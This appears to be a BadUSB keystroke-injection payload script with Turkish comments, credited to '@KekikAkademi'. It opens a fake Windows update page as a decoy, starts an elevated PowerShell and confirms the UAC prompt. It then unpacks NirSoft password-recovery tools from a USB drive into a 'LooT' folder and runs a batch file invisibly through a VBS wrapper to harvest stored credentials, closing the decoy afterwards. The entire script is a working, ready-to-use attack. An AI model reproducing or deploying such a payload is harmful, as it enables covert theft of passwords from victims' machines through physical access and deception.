// @KekikAkademi Edit ~
delay(500);
press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
delay(500);
// @KekikAkademi Edit #

// Fake Update Sayfası Açılıyor
layout("US"); // US Klavye Düzeni Seçiyor
typingSpeed(0,0); // Hızlı Yazması İçin
press("GUI R");
delay(500);
type("iexplore -k http://fakeupdate.net/win10u/index.html\n")
delay(500);

// Şifreler
press("WIN"); // Başlat
delay(500);
type("powershell");
delay(500);
press("CTRL SHIFT ENTER");
delay(500);
press("ALT y");
delay(750);
type("$usbPath =((gwmi win32_volume -f 'label=''4GB_Disk''').Name+'NirSoft\')\n"); //4GB_Disk >> USB Adı -- Kekik >> Klasör Adı
delay(500);
type("cd $usbPath\n");
delay(500);
type("Expand-Archive -Path NirSoft_Passwd.zip -DestinationPath ../../LooT/NirSoft/$env:COMPUTERNAME/\n");
delay(500);
type("cd ../../LooT/NirSoft/$env:COMPUTERNAME/\n");
delay(500);
type("C:/windows/System32/wscript.exe invisible.vbs TheRealAnnoyance.bat\n");
delay(500);
type("exit\n");
delay(500);

// Fake Update Sayfası Kapatılıyor
press("ALT TAB");
delay(5500);
press("ALT F4");

// @KekikAkademi Edit ~
delay(500);
press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
delay(500);
// @KekikAkademi Edit #